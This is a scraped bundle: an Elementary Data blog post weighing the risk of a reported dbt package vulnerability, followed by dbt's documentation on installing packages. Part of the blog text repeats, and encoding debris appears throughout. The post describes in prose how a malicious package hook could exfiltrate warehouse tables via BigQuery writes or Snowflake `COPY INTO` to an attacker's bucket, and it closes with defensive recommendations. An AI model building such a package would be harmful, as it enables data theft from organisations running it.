From Bigquery's Overview of Event Threat Detection Guide

â

This default policy can be changed of course. How? If you have a few days of work to kill and amazing patience, you can search the Bigquery documentation. Luckily, Paul [published a guide](https://tempered.works/posts/2024/07/06/preventing-data-theft-with-gcp-service-controls/).

Is data exfiltration so easy just in Bigquery? No.Â
The same tradeoff of usability and security applies when data warehouses add features. In an effort to allow easier data sharing and management, they created such vulnerabilities.Â
For example - Snowflake supports `COPY INTO` external locations. I assume many run their production dbt project with a user that has privileges to do so. An attacker could add a hook to a package that runs `COPY INTO` of your tables to his S3 bucket.

A quick search led me to a [recent Mandiant report about the breach in Snowflake](https://cloud.google.com/blog/topics/threat-intelligence/unc5537-snowflake-data-theft-extortion) that they investigated.Â
`COPY INTO` external storage was the exact technique the attacker used for exfiltration. Adding a new external storage requires high privileges. The attacker was also seen listing the existing external storages. Itâs likely that some of these were publicly accessible, allowing him to exfiltrate data without even adding a new external storage.Â

I know what you must be thinking.Â

â
Why is this a vulnerability and not a permission and data warehouse management issue?Â

[![](https://cdn.prod.website-files.com/6600900f6b80d2b70b387dc4/66ace0f2df469e2b0de08304_668bb426d19ed688f63362c6_slack%2520messages%2520for%2520blog.png)](https://getdbt.slack.com/archives/C01NH3F2E05/p1720001546356899)

Discussion on the dbt community Slack

â

In my opinion, it comes down to the huge impact of these misconfigurations.
The platforms donât make it easy to avoid such errors, their defaults are too permissive, and they donât add safety mechanisms.
This makes the exploit of such misconfigurations probable, and impactful.
The definition of a critical security vulnerability.Â

Should users be fully responsible for those risks?
â
Think about your banking app and how it balances security and usability.
Does your bank expect you to be fully responsible for risks?
When you do a large money transfer to another account, 2FAÂ is probably required. We accept this inconvenience as users. As this is a high risk action, we even expect it to include additional safeties. The responsibility for security isn't only on us as users.

Why shouldn't we expect the same from our data platform?Â
Time will tell, but I assume following this Snowflake breach the data warehouses will make significant changes in their permissions and security operations.Â

## Bottom lines and recommendations

â**The dbt package vulnerability by itself is almost meaningless.** I will argue that **the benefits of external code packages in dbt development, just like in software development, justify it.**

In fact, there are various other attack vectors for code execution on the data warehouse: Packages of non-dbt code that runs commands (Python / Java), malicious contribution to open source orchestrators (Airflow, Prefect, Dagster), attacking a vendor that has access to the DWH, or the easiest of all - Stealing credentials from someone in your organization. I investigated hundreds of attacks, this is the most common attack vector.Â

### What should you do?

**Focus on reducing the impact of malicious code execution by enforcing strict permissions and network policies.**If you want to reduce your exposure to dbt packages risks specifically:

* Download packages only from trusted maintainers with good reputations.Â
* Create a review process for introducing packages:Â some text
  + Define who can authorize adding new packages.
  + Run in Dev without access to production data, check query history to see what the package actually executes.
* Limit to a minimum the permissions of your dbt user.Â

â

## Contributors

##

No items found.

**In light of the recent publication of a dbt vulnerability, what are the risks and security implications of using dbt packages, and the real data breach risk in your data platform?**â

On May 3rd, the dbt team opened [an issue](https://github.com/elementary-data/dbt-data-reliability/issues/703) on the [Elementary dbt package](https://github.com/elementary-data/dbt-data-reliability) repository, to notify us of a planned breaking change. Two months later, we learned what lead to this change, when [Paul Brabban](https://www.linkedin.com/in/paulbrabban/) published a post titled â[Are you at risk from this critical dbt vulnerability?](https://www.equalexperts.com/blog/tech-focus/are-you-at-risk-from-this-critical-dbt-vulnerability/)â.

A headline like that can definitely make you sit up and take notice, especially as this happened not long after publications on a [significant Snowflake breach](https://www.wired.com/story/snowflake-breach-advanced-auto-parts-lendingtree/). We got tons of questions from Elementary users following this post and the change dbt deployed. Before we all start panicking, letâs dive into the context and implications of this alleged critical dbt vulnerability.

Following a [discussion on the dbt Slack](https://getdbt.slack.com/archives/C01NH3F2E05/p1720001546356899), I want to break down my take on it, what it means for companies using dbt, and security practices in your data platform as a whole.

Think of it as turning a potential "oh no" moment into a chance to level up our data game and understand the security aspects of it.

## Iâm a security expert and dbt package maintainerÂ

As someone who knows how sensitive data is for our customers, I get it â security issues are no joke. In fact, I personally know how serious security vulnerabilities are. My background is in security research, and before starting Elementary I was leading Cyber Security Incident Response engagements at an elite security consulting firm.

For more than 4 years I was knee-deep in investigating and responding to attacks on various companies, including Fortune 500, that resulted in millions of dollars in damages. Many of these attacks included malicious access to databases and data exfiltration.

All of these organizations invested heavily in data protection and followed security best practices. So why were they still vulnerable? Because ultimately, security involves making tradeoffs.

## Tradeoffs between usability, resources, and security

I often tell customers they can achieve a data platform without data issues. Easily. Donât ingest new data, and donât build any new data pipelines and products. If you actually leverage data, you are bound to have problems.Â

Security is the same. If you try to create a fully secure system, it will probably also be unusable and irrelevant.
Zooming in on data platforms - It is probably safer not to give ingestion tools like Fivetran, Stitch, and Airbyte credentials to read sensitive data from all of our internal databases and 3rd party vendors. It also isnât the best idea in the world to give a BI tool access to read and store all of our data.Â

But we do it because otherwise, we couldnât create a useful data platform with reasonable resources. Some will decide to invest in risk reduction, like paying for an on-prem deployment. But these are still tradeoffs between usability, resources, and security.
In theory, your data platform can be a silo, without interfaces open to users and vendors. It might not have vulnerabilities, but will it still be useful and valuable?

So should we just give up and accept it? Of course not.Â
Our focus should be on understanding if we have critical vulnerabilities.

## What makes a vulnerability critical?

There is a [standard for scoring](https://www.first.org/cvss/v3.1/specification-document) the severity of vulnerabilities (CVSS) with a score between 0.1 to 10, 9-10 would mean a critical vulnerability. It takes into account different factors, that I can simplify and summarize - how probable is it for an attacker to exploit the vulnerability, and what would be the impact?

## dbt packages - security implications and the recently published vulnerability

Iâm no vulnerabilities scoring professional, but Iâll share my humble opinion, as one of the developers of a very popular dbt package, and a former security expert.

**Yes, Iâm finally addressing the reported vulnerability.**
Public dbt packages are open-source code packages you can import to your dbt code. Once you import a package, it becomes part of your code base. Importing external packages is a common practice in software development that introduces [security risks](https://snyk.io/series/open-source-security/).Â

In dbt packages specifically, code of the package is often executed by default as part of your dbt commands. This means code written by the package creators (and contributors) is executed as part of your dbt runs, with dbtâs production user permissions.

This is the vulnerability described in the post. The scenario in the post describes a malicious override of materialization. The change introduces in dbt 1.8 is that overriding the materialization from a package requires a flag, but there are various other methods to exploit. If the package includes hooks or models, these will be executed unless you explicitly exclude them. If the package introduces macros that override dbtâs default ones (same as materializations), the package macros will be executed.

But here is a significant context: What code can be included in and executed by a dbt package? Only valid SQL commands, that the user running dbt is permitted to run.

As part of the attack scenario in the post, the malicious materialization code includes an SQL command to write the victim's tables to a public Bigquery database. This is the exfiltration of private data, so a full data breach attack vector.

## Is this dbt package vulnerability critical? Not on its own

What will need to happen for an attacker to exploit this vulnerability on your data platform?Â

1. **Including malicious code in a dbt package** - The attacker will need to make a contribution of malicious code to a public dbt package, or publish a new dbt package.Â some text
   1. Creating a new dbt package - High effort - will require building value for users so they actually download it.Â
   2. Making a contribution - The malicious code will need to pass the review of the package maintainers.Â
2. dbt will accept the code to dbt hub - Similar to other hubs, [dbt doesnât guarantee packages security](https://hub.getdbt.com/disclaimer/).Â
3. **A user would need to download the malicious package and deploy it to production** - Different organizations have different policies here. Can any user introduce any package? Will it run in dev first? Who will need to approve this step?
4. **The dbt user running the package will need permission to execute the malicious command**â
   1. In my opinion, this is the most important piece. The permissions will determine the potential impact of the attack.

Letâs evaluate using [CVSS metrics](https://www.sans.org/blog/what-is-cvss/), addressing probability and impact:

**Exploit probability**

* **Local attack vector** - This means no network access. The attacker will at no point gain direct access to data warehouse. It will rely on the code that is executed locally.Â
* **Required user interaction** - At the very least, the attacker relies on a user to download the package. More likely, it also relies on package maintainers to accept the contribution, and on someone beyond the user to approve the deployment of the package to production.
* **High attack complexity** - Defined as âA successful attack depends on conditions beyond the attacker's controlâ. In this case, itâs the required user interactions and permissions of the dbt user.

These factors make the vulnerability exploitability low.Â

But what will determine the impact?
The answer is the complicated, borderline impossible-to-understand, permissions structure of your data warehouse.

## Data warehouse permissions - the real vulnerability in your stack

In the scenario described in the post, the dbt user has permission and access to write the organization's private data to a public Bigquery project.Â
By default, any users with read access permissions to data can do this. I know, this is crazy.Â

**This is a known vulnerability.Â**

Known to who? To Bigquery.
Their [paid threat detection service](https://cloud.google.com/security-command-center/docs/concepts-event-threat-detection-overview) will alert you on such actions, as potential âBigquery data exfiltrationâ.

[![](https://cdn.prod.website-files.com/6600900f6b80d2b70b387dc4/668aa8ca52e206222084c5cc_AD_4nXe-bDdbAR_QJnZfxtVglS6q672jTa3fe0Pg_gCsiCEf9Z0El1BfgQtrKHlSQoC6jTd0y-73aG12pYudnDoNtqfte0FizGKjbHCXgMH311bIj2YWYFenAHU9VpNhGev6LPxAsXK_fu--hLslLgh8FP4-PtdV.png)](https://getdbt.slack.com/archives/C01NH3F2E05/p1720001546356899)

From Bigquery's Overview of Event Threat Detection Guide

â

This default policy can be changed of course. How? If you have a few days of work to kill and amazing patience, you can search the Bigquery documentation. Luckily, Paul [published a guide](https://tempered.works/posts/2024/07/06/preventing-data-theft-with-gcp-service-controls/).

Is data exfiltration so easy just in Bigquery? No.Â
The same tradeoff of usability and security applies when data warehouses add features. In an effort to allow easier data sharing and management, they created such vulnerabilities.Â
For example - Snowflake supports `COPY INTO` external locations. I assume many run their production dbt project with a user that has privileges to do so. An attacker could add a hook to a package that runs `COPY INTO` of your tables to his S3 bucket.

A quick search led me to a [recent Mandiant report about the breach in Snowflake](https://cloud.google.com/blog/topics/threat-intelligence/unc5537-snowflake-data-theft-extortion) that they investigated.Â
`COPY INTO` external storage was the exact technique the attacker used for exfiltration. Adding a new external storage requires high privileges. The attacker was also seen listing the existing external storages. Itâs likely that some of these were publicly accessible, allowing him to exfiltrate data without even adding a new external storage.Â

I know what you must be thinking.Â

â
Why is this a vulnerability and not a permission and data warehouse management issue?Â

[![](https://cdn.prod.website-files.com/6600900f6b80d2b70b387dc4/66ace0f2df469e2b0de08304_668bb426d19ed688f63362c6_slack%2520messages%2520for%2520blog.png)](https://getdbt.slack.com/archives/C01NH3F2E05/p1720001546356899)

Discussion on the dbt community Slack

â

In my opinion, it comes down to the huge impact of these misconfigurations.
The platforms donât make it easy to avoid such errors, their defaults are too permissive, and they donât add safety mechanisms.
This makes the exploit of such misconfigurations probable, and impactful.
The definition of a critical security vulnerability.Â

Should users be fully responsible for those risks?
â
Think about your banking app and how it balances security and usability.
Does your bank expect you to be fully responsible for risks?
When you do a large money transfer to another account, 2FAÂ is probably required. We accept this inconvenience as users. As this is a high risk action, we even expect it to include additional safeties. The responsibility for security isn't only on us as users.

Why shouldn't we expect the same from our data platform?Â
Time will tell, but I assume following this Snowflake breach the data warehouses will make significant changes in their permissions and security operations.Â

## Bottom lines and recommendations

â**The dbt package vulnerability by itself is almost meaningless.** I will argue that **the benefits of external code packages in dbt development, just like in software development, justify it.**

In fact, there are various other attack vectors for code execution on the data warehouse: Packages of non-dbt code that runs commands (Python / Java), malicious contribution to open source orchestrators (Airflow, Prefect, Dagster), attacking a vendor that has access to the DWH, or the easiest of all - Stealing credentials from someone in your organization. I investigated hundreds of attacks, this is the most common attack vector.Â

### What should you do?

**Focus on reducing the impact of malicious code execution by enforcing strict permissions and network policies.**If you want to reduce your exposure to dbt packages risks specifically:

* Download packages only from trusted maintainers with good reputations.Â
* Create a review process for introducing packages:Â some text
  + Define who can authorize adding new packages.
  + Run in Dev without access to production data, check query history to see what the package actually executes.
* Limit to a minimum the permissions of your dbt user.Â

â

## Contributors

##

No items found.

![](https://cdn.prod.website-files.com/65ec9eebc532cfda4df5fcd7/65ee1822aff715b49a58d9b1_Droplet-falling.svg)![](https://cdn.prod.website-files.com/65ec9eebc532cfda4df5fcd7/65ee1822aff715b49a58d9b1_Droplet-falling.svg)![](https://cdn.prod.website-files.com/65ec9eebc532cfda4df5fcd7/65ee1822aff715b49a58d9b1_Droplet-falling.svg)![](https://cdn.prod.website-files.com/65ec9eebc532cfda4df5fcd7/65ee1822aff715b49a58d9b1_Droplet-falling.svg)![](https://cdn.prod.website-files.com/65ec9eebc532cfda4df5fcd7/65ee1822aff715b49a58d9b1_Droplet-falling.svg)![](https://cdn.prod.website-files.com/65ec9eebc532cfda4df5fcd7/65ee1822aff715b49a58d9b1_Droplet-falling.svg)![](https://cdn.prod.website-files.com/65ec9eebc532cfda4df5fcd7/65ee1822aff715b49a58d9b1_Droplet-falling.svg)![](https://cdn.prod.website-files.com/65ec9eebc532cfda4df5fcd7/65ee1822aff715b49a58d9b1_Droplet-falling.svg)![](https://cdn.prod.website-files.com/65ec9eebc532cfda4df5fcd7/65ee1822aff715b49a58d9b1_Droplet-falling.svg)![](https://cdn.prod.website-files.com/65ec9eebc532cfda4df5fcd7/65ee1822aff715b49a58d9b1_Droplet-falling.svg)
## Stop firefighting. It's Elementary

[Start a free trial](https://elementary-data.frontegg.com/oauth/account/sign-up)[Schedule a call](/schedule-a-call)
## Product

[Book a Demo](/schedule-a-call)[Pricing](/pricing)[Elementary Cloud](https://app.elementary-data.com/)[Elementary Open Source](https://docs.elementary-data.com/quickstart)[Anomaly detection](https://docs.elementary-data.com/guides/how-anomaly-detection-works)[dbt package](https://docs.elementary-data.com/guides/modules-overview/dbt-package)
## RESOURCES

[Documentation](https://docs.elementary-data.com/introduction)[Blog](/blog)[Slack community](/community)
## COMPANY

[Handbook](https://handbook.elementary-data.com/start-here)Contact us[Careers](https://handbook.elementary-data.com/people/hiring)
## CONNECT

[Github](https://github.com/elementary-data/elementary)[Linkedin](https://www.linkedin.com/company/elementary-data)[Slack](https://www.elementary-data.com/community)[Book a Demo](/schedule-a-call)[TERMS OF SERVICE](/terms-of-service)[PRIVACY POLICY](/privacy)2024 Â© ELEMENTARY DATA![Elementary logo](https://cdn.prod.website-files.com/65ec9eebc532cfda4df5fcd7/6703d0ba18c8273501ed307d_logo.svg)![](https://cdn.prod.website-files.com/65ec9eebc532cfda4df5fcd7/6703d0f464c092cc808b88ae_soc2.avif)SOC2 Compliant![](https://cdn.prod.website-files.com/65ec9eebc532cfda4df5fcd7/6703d1508a9f1b598d9527f3_y-combinator.png)Backed by Y Combinator[TERMS OF SERVICE](/terms-of-service)[PRIVACY POLICY](/privacy)2024 Â© ELEMENTARY DATA



=== Content from docs.getdbt.com_8a0a3936_20250110_152644.html ===

[Skip to main content](#__docusaurus_skipToContent_fallback)[Join our biweekly demos and see dbt Cloud in action!](https://www.getdbt.com/resources/webinars/dbt-cloud-demos-with-experts/?utm_medium=i[…]ly-demos_aw&utm_content=biweekly-demos____&utm_term=all_all__)[![dbt Logo](/img/dbt-logo.svg)![dbt Logo](/img/dbt-logo-light.svg)](/)[Docs](/docs/build/packages)

* [Product docs](/docs/introduction)
* [API docs](/docs/dbt-cloud-apis/overview)
* [Best practices](/best-practices)
* [Release notes](/docs/dbt-versions/dbt-cloud-release-notes)
[Guides](/guides)[Reference](/reference/references-overview)[v](/docs/build/packages)

* Cloud (Latest)
* 1.9 (Compatible)
* 1.8
* 1.7
[Resources](/docs/build/packages)

* [Courses](https://learn.getdbt.com)
* [Best practices](/best-practices)
* [Developer blog](/blog)
[Community](/docs/build/packages)

* [Join the dbt Community](/community/join)
* [Become a contributor](/community/contribute)
* [Community forum](/community/forum)
* [Events](/community/events)
* [Spotlight](/community/spotlight)
[Create a free account](https://www.getdbt.com/signup/)Search[![dbt Logo](/img/dbt-logo.svg)![dbt Logo](/img/dbt-logo-light.svg)](/)

* [What is dbt?](/docs/introduction)
* [Get started with dbt](/docs/get-started-dbt)
* [Supported data platforms](/docs/supported-data-platforms)
* [About dbt Cloud](/docs/cloud/about-cloud/dbt-cloud-features)
* [Set up dbt](/docs/about-setup)
* [Develop with dbt Cloud](/docs/cloud/about-develop-dbt)
* [Build dbt projects](/docs/build/projects)
  + [About dbt projects](/docs/build/projects)
  + [dbt tips and tricks](/docs/build/dbt-tips)
  + [Build your DAG](/docs/build/models)
  + [Build your metrics](/docs/build/build-metrics-intro)
  + [Enhance your models](/docs/build/enhance-your-models)
  + [Enhance your code](/docs/build/enhance-your-code)
    - [Enhance your code](/docs/build/enhance-your-code)
    - [Project variables](/docs/build/project-variables)
    - [Environment variables](/docs/build/environment-variables)
    - [Packages](/docs/build/packages)
    - [Hooks and operations](/docs/build/hooks-operations)
  + [Organize your outputs](/docs/build/organize-your-outputs)
* [Deploy dbt](/docs/deploy/deployments)
* [Collaborate with others](/docs/collaborate/collaborate-with-others)
* [Use the dbt Semantic Layer](/docs/use-dbt-semantic-layer/dbt-sl)
* [dbt Cloud APIs](/docs/dbt-cloud-apis/overview)
* [dbt Cloud integrations](/docs/cloud-integrations/overview)
* [Available dbt versions](/docs/dbt-versions/core)
* [dbt support](/docs/dbt-support)
* [Frequently asked questions](/docs/faqs)

* [Build dbt projects](/docs/build/projects)
* [Enhance your code](/docs/build/enhance-your-code)
* Packages
On this page
# Packages

Software engineers frequently modularize code into libraries. These libraries help programmers operate with leverage: they can spend more time focusing on their unique business logic, and less time implementing code that someone else has already spent the time perfecting.

In dbt, libraries like these are called *packages*. dbt's packages are so powerful because so many of the analytic problems we encountered are shared across organizations, for example:

* transforming data from a consistently structured SaaS dataset, for example:
  + turning [Snowplow](https://hub.getdbt.com/dbt-labs/snowplow/latest/) or [Segment](https://hub.getdbt.com/dbt-labs/segment/latest/) pageviews into sessions
  + transforming [AdWords](https://hub.getdbt.com/dbt-labs/adwords/latest/) or [Facebook Ads](https://hub.getdbt.com/dbt-labs/facebook_ads/latest/) spend data into a consistent format.
* writing dbt macros that perform similar functions, for example:
  + [generating SQL](https://github.com/dbt-labs/dbt-utils#sql-helpers) to union together two relations, pivot columns, or construct a surrogate key
  + creating [custom schema tests](https://github.com/dbt-labs/dbt-utils#schema-tests)
  + writing [audit queries](https://hub.getdbt.com/dbt-labs/audit_helper/latest/)
* building models and macros for a particular tool used in your data stack, for example:
  + Models to understand [Redshift](https://hub.getdbt.com/dbt-labs/redshift/latest/) privileges.
  + Macros to work with data loaded by [Stitch](https://hub.getdbt.com/dbt-labs/stitch_utils/latest/).

dbt *packages* are in fact standalone dbt projects, with models, macros, and other resources that tackle a specific problem area. As a dbt user, by adding a package to your project, all of the package's resources will become part of your own project. This means:

* Models in the package will be materialized when you `dbt run`.
* You can use `ref` in your own models to refer to models from the package.
* You can use `source` to refer to sources in the package.
* You can use macros in the package in your own project.
* It's important to note that defining and installing dbt packages is different from [defining and installing Python packages](/docs/build/python-models#using-pypi-packages)

## Use cases[​](/docs/build/packages#use-cases "Direct link to Use cases")

The following setup will work for every dbt project:

* Add [any package dependencies](/docs/collaborate/govern/project-dependencies#when-to-use-project-dependencies) to `packages.yml`
* Add [any project dependencies](/docs/collaborate/govern/project-dependencies#when-to-use-package-dependencies) to `dependencies.yml`

However, you may be able to consolidate both into a single `dependencies.yml` file. Read the following section to learn more.

#### About packages.yml and dependencies.yml[​](/docs/build/packages#about-packagesyml-and-dependenciesyml "Direct link to About packages.yml and dependencies.yml")

The `dependencies.yml`. file can contain both types of dependencies: "package" and "project" dependencies.

* [Package dependencies](/docs/build/packages#how-do-i-add-a-package-to-my-project) lets you add source code from someone else's dbt project into your own, like a library.
* Project dependencies provide a different way to build on top of someone else's work in dbt.

If your dbt project doesn't require the use of Jinja within the package specifications, you can simply rename your existing `packages.yml` to `dependencies.yml`. However, something to note is if your project's package specifications use Jinja, particularly for scenarios like adding an environment variable or a [Git token method](/docs/build/packages#git-token-method) in a private Git package specification, you should continue using the `packages.yml` file name.

Use the following toggles to understand the differences and determine when to use `dependencies.yml` or `packages.yml` (or both). Refer to the [FAQs](/docs/build/packages#faqs) for more info.

 When to use Project dependencies

Project dependencies are designed for the [dbt Mesh](/best-practices/how-we-mesh/mesh-1-intro) and [cross-project reference](/docs/collaborate/govern/project-dependencies#how-to-write-cross-project-ref) workflow:

* Use `dependencies.yml` when you need to set up cross-project references between different dbt projects, especially in a dbt Mesh setup.
* Use `dependencies.yml` when you want to include both projects and non-private dbt packages in your project's dependencies.
  + Private packages are not supported in `dependencies.yml` because they intentionally don't support Jinja rendering or conditional configuration. This is to maintain static and predictable configuration and ensures compatibility with other services, like dbt Cloud.
* Use `dependencies.yml` for organization and maintainability if you're using both [cross-project refs](/docs/collaborate/govern/project-dependencies#how-to-write-cross-project-ref) and [dbt Hub packages](https://hub.getdbt.com/). This reduces the need for multiple YAML files to manage dependencies.

 When to use Package dependencies

Package dependencies allow you to add source code from someone else's dbt project into your own, like a library:

* If you only use packages like those from the [dbt Hub](https://hub.getdbt.com/), remain with `packages.yml`.
* Use `packages.yml` when you want to download dbt packages, such as dbt projects, into your root or parent dbt project. Something to note is that it doesn't contribute to the dbt Mesh workflow.
* Use `packages.yml` to include packages, including private packages, in your project's dependencies. If you have private packages that you need to reference, `packages.yml` is the way to go.
* `packages.yml` supports Jinja rendering for historical reasons, allowing dynamic configurations. This can be useful if you need to insert values, like a [Git token method](/docs/build/packages#git-token-method) from an environment variable, into your package specifications.

Currently, to use private git repositories in dbt, you need to use a workaround that involves embedding a git token with Jinja. This is not ideal as it requires extra steps like creating a user and sharing a git token. We're planning to introduce a simpler method soon that won't require Jinja-embedded secret environment variables. For that reason, `dependencies.yml` does not support Jinja.

## How do I add a package to my project?[​](/docs/build/packages#how-do-i-add-a-package-to-my-project "Direct link to How do I add a package to my project?")

1. Add a file named `dependencies.yml` or `packages.yml` to your dbt project. This should be at the same level as your `dbt_project.yml` file.
2. Specify the package(s) you wish to add using one of the supported syntaxes, for example:

```
packages:
  - package: dbt-labs/snowplow
    version: 0.7.0

  - git: "https://github.com/dbt-labs/dbt-utils.git"
    revision: 0.9.2

  - local: /opt/dbt/redshift

```

The default [`packages-install-path`](/reference/project-configs/packages-install-path) is `dbt_packages`.

3. Run `dbt deps` to install the package(s). Packages get installed in the `dbt_packages` directory – by default this directory is ignored by git, to avoid duplicating the source code for the package.

## How do I specify a package?[​](/docs/build/packages#how-do-i-specify-a-package "Direct link to How do I specify a package?")

You can specify a package using one of the following methods, depending on where your package is stored.

### Hub packages (recommended)[​](/docs/build/packages#hub-packages-recommended "Direct link to Hub packages (recommended)")

dbt Labs hosts the [Package hub](https://hub.getdbt.com), registry for dbt packages, as a courtesy to the dbt Community, but does not certify or confirm the integrity, operability, effectiveness, or security of any Packages. Please read the [dbt Labs Package Disclaimer](https://hub.getdbt.com/disclaimer/) before installing Hub packages.

You can install available hub packages in the following way:

packages.yml
```
packages:
  - package: dbt-labs/snowplow
    version: 0.7.3 # version number

```

Hub packages require a version to be specified – you can find the latest release number on dbt Hub. Since Hub packages use [semantic versioning](https://semver.org/), we recommend pinning your package to the latest patch version from a specific minor release, like so:

```
packages:
  - package: dbt-labs/snowplow
    version: [">=0.7.0", "<0.8.0"]

```

`dbt deps` "pins" each package by default. See ["Pinning packages"](/docs/build/packages#pinning-packages) for details.

Where possible, we recommend installing packages via dbt Hub, since this allows dbt to handle duplicate dependencies. This is helpful in situations such as:

* Your project uses both the dbt-utils and Snowplow packages, and the Snowplow package *also* uses the dbt-utils package.
* Your project uses both the Snowplow and Stripe packages, both of which use the dbt-utils package.

In comparison, other package installation methods are unable to handle the duplicate dbt-utils package.

Advanced users can choose to host an internal version of the package hub based on [this repository](https://github.com/dbt-labs/hub.getdbt.com) and setting the `DBT_PACKAGE_HUB_URL` environment variable.

#### Prerelease versions[​](/docs/build/packages#prerelease-versions "Direct link to Prerelease versions")

Some package maintainers may wish to push prerelease versions of packages to the dbt Hub, in order to test out new functionality or compatibility with a new version of dbt. A prerelease version is demarcated by a suffix, such as `a1` (first alpha), `b2` (second beta), or `rc3` (third release candidate).

By default, `dbt deps` will not include prerelease versions when resolving package dependencies. You can enable the installation of prereleases in one of two ways:

* Explicitly specifying a prerelease version in your `version` criteria
* Setting `install_prerelease` to `true`, and providing a compatible version range

For example, both of the following configurations would successfully install `0.4.5-a2` for the [`dbt_artifacts` package](https://hub.getdbt.com/brooklyn-data/dbt_artifacts/latest/):

```
packages:
  - package: brooklyn-data/dbt_artifacts
    version: 0.4.5-a2

```

```
packages:
  - package: brooklyn-data/dbt_artifacts
    version: [">=0.4.4", "<0.4.6"]
    install_prerelease: true

```
### Git packages[​](/docs/build/packages#git-packages "Direct link to Git packages")

Packages stored on a Git server can be installed using the `git` syntax, like so:

packages.yml
```
packages:
  - git: "https://github.com/dbt-labs/dbt-utils.git" # git URL
    revision: 0.9.2 # tag or branch name

```

Add the Git URL for the package, and optionally specify a revision. The revision can be:

* a branch name
* a tagged release
* a specific commit (full 40-character hash)

Example of a revision specifying a 40-character hash:

```
packages:
  - git: "https://github.com/dbt-labs/dbt-utils.git"
    revision: 4e28d6da126e2940d17f697de783a717f2503188

```

By default, `dbt deps` "pins" each package. See ["Pinning packages"](/docs/build/packages#pinning-packages) for details.

### Internally hosted tarball URL[​](/docs/build/packages#internally-hosted-tarball-url "Direct link to Internally hosted tarball URL")

Some organizations have security requirements to pull resources only from internal services. To address the need to install packages from hosted environments such as Artifactory or cloud storage buckets, dbt Core enables you to install packages from internally-hosted tarball URLs.

```
packages:
  - tarball: https://codeload.github.com/dbt-labs/dbt-utils/tar.gz/0.9.6
    name: 'dbt_utils'

```

Where `name: 'dbt_utils'` specifies the subfolder of `dbt_packages` that's created for the package source code to be installed within.

## Private packages[​](/docs/build/packages#private-packages "Direct link to Private packages")

### Native private packages beta[​](/docs/build/packages#native-private-packages- "Direct link to native-private-packages-")

dbt Cloud supports private packages from [supported](/docs/build/packages#prerequisites) Git repos leveraging an existing [configuration](/docs/cloud/git/git-configuration-in-dbt-cloud) in your environment. Previously, you had to configure a [token](/docs/build/packages#git-token-method) to retrieve packages from your private repos.

#### Prerequisites[​](/docs/build/packages#prerequisites "Direct link to Prerequisites")

* To use native private packages, you must have one of the following Git providers configured in the **Integrations** section of your **Account settings**:
  + [GitHub](/docs/cloud/git/connect-github)
  + [Azure DevOps](/docs/cloud/git/connect-azure-devops)
    - Private packages only work within a single Azure DevOps project. If your repositories are in different projects within the same organization, you can't reference them in the `private` key at this time.
    - For Azure DevOps, use the `org/repo` path (not the `org_name/project_name/repo_name` path) with the project tier inherited from the integrated source repository.
  + Support for GitLab is coming soon.

#### Configuration[​](/docs/build/packages#configuration "Direct link to Configuration")

Use the `private` key in your `packages.yml` or `dependencies.yml` to clone package repos using your existing dbt Cloud Git integration without having to provision an access token or create a dbt Cloud environment variable.

packages.yml
```
packages:
  - private: dbt-labs/awesome_repo # your-org/your-repo path
  - package: normal packages
  [...]

```

Azure DevOps considerations

* Private packages currently only work if the package repository is in the same Azure DevOps project as the source repo.
* Use the `org/repo` path (not the normal ADO `org_name/project_name/repo_name` path) in the `private` key.
* Repositories in different Azure DevOps projects is currently not supported until a future update.

You can use private packages by specifying `org/repo` in the `private` key:

packages.yml
```
packages:
  - private: my-org/my-repo # Works if your ADO source repo and package repo are in the same project

```

You can pin private packages similar to regular dbt packages:

```
packages:
  - private: dbt-labs/awesome_repo
    revision: "0.9.5" # Pin to a tag, branch, or complete 40-character commit hash

```

If you are using multiple Git integrations, disambiguate by adding the provider key:

```
packages:
  - private: dbt-labs/awesome_repo
    provider: "github" # GitHub and Azure are currently supported. GitLab is coming soon.

```

With this method, you can retrieve private packages from an integrated Git provider without any additional steps to connect.

### SSH key method (command line only)[​](/docs/build/packages#ssh-key-method-command-line-only "Direct link to SSH key method (command line only)")

If you're using the Command Line, private packages can be cloned via SSH and an SSH key.

When you use SSH keys to authenticate to your git remote server, you don’t need to supply your username and password each time. Read more about SSH keys, how to generate them, and how to add them to your git provider here: [Github](https://docs.github.com/en/github/authenticating-to-github/connecting-to-github-with-ssh) and [GitLab](https://docs.gitlab.com/ee/user/ssh.html).

packages.yml
```
packages:
  - git: "git@github.com:dbt-labs/dbt-utils.git" # git SSH URL

```

If you're using dbt Cloud, the SSH key method will not work, but you can use the [HTTPS Git Token Method](https://docs.getdbt.com/docs/build/packages#git-token-method).

### Git token method[​](/docs/build/packages#git-token-method "Direct link to Git token method")

note

dbt Cloud has [native support](/docs/build/packages#native-private-packages) for Git hosted private packages with GitHub and Azure DevOps (GitLab coming soon). If you are using a supported [integrated Git environment](/docs/cloud/git/git-configuration-in-dbt-cloud), you no longer need to configure Git tokens to retrieve private packages.

This method allows the user to clone via HTTPS by passing in a git token via an environment variable. Be careful of the expiration date of any token you use, as an expired token could cause a scheduled run to fail. Additionally, user tokens can create a challenge if the user ever loses access to a specific repo.

dbt Cloud usage

If you are using dbt Cloud, you must adhere to the naming conventions for environment variables. Environment variables in dbt Cloud must be prefixed with either `DBT_` or `DBT_ENV_SECRET`. Environment variables keys are uppercased and case sensitive. When referencing `{{env_var('DBT_KEY')}}` in your project's code, the key must match exactly the variable defined in dbt Cloud's UI.

In GitHub:

packages.yml
```
packages:
  # use this format when accessing your repository via a github application token
  - git: "https://{{env_var('DBT_ENV_SECRET_GIT_CREDENTIAL')}}@github.com/dbt-labs/awesome_repo.git" # git HTTPS URL

  # use this format when accessing your repository via a classical personal access token
  - git: "https://{{env_var('DBT_ENV_SECRET_GIT_CREDENTIAL')}}@github.com/dbt-labs/awesome_repo.git" # git HTTPS URL

   # use this format when accessing your repository via a fine-grained personal access token (username sometimes required)
  - git: "https://GITHUB_USERNAME:{{env_var('DBT_ENV_SECRET_GIT_CREDENTIAL')}}@github.com/dbt-labs/awesome_repo.git" # git HTTPS URL

```

Read more about creating a GitHub Personal Access token [here](https://docs.github.com/en/enterprise-server%403.1/github/authenticating-to-github/keeping-your-account-and-data-secure/creating-a-personal-access-token). You can also use a GitHub App installation [token](https://docs.github.com/en/rest/reference/apps#create-an-installation-access-token-for-an-app).

In GitLab:

packages.yml
```
packages:
  - git: "https://{{env_var('DBT_USER_NAME')}}:{{env_var('DBT_ENV_SECRET_DEPLOY_TOKEN')}}@gitlab.example.com/dbt-labs/awesome_project.git" # git HTTPS URL

```

